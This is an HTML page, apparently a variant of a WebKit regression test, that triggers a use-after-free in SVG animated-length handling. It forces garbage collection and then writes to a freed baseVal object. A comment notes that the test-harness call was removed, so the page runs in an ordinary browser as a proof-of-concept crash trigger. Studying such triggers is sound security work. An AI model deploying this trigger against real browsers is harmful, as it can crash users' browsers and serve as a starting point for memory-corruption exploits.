<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>WebKit SVG UAF Test - Variant B</title>
</head>

<body>

<script>
function gc() {
    function gcRec(n) {
        if (n < 1)
            return {};

        var temp = { i: "ab" + i + (i / 100000) };
        temp += "foo";
        gcRec(n - 1);
    }

    for (var i = 0; i < 10000; i++)
        gcRec(10);
}

onload = async () => {
    let svg0 = document.createElementNS(
        'http://www.w3.org/2000/svg',
        'svg'
    );

    let svgAnimatedLength = svg0.width;

    // internals.observeGC(svgAnimatedLength) removido

    let baseVal = svgAnimatedLength.baseVal;

    let clipPath0 = document.createElementNS(
        'http://www.w3.org/2000/svg',
        'clipPath'
    );

    svg0.append(clipPath0);
    clipPath0.append('');

    await Promise.resolve();

    gc();

    baseVal.value = 0;

    document.body.innerHTML = 'PASS if no crash';
};
</script>

</body>
</html>
